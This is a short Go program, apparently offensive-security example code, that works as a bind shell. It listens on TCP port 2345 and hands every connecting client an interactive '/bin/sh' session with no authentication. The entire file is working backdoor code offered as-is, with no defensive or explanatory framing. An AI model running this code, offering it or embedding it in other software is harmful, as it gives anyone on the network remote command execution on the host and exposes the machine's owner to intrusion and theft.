package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	cmd := exec.Command("/bin/sh", "-i")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":2345")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
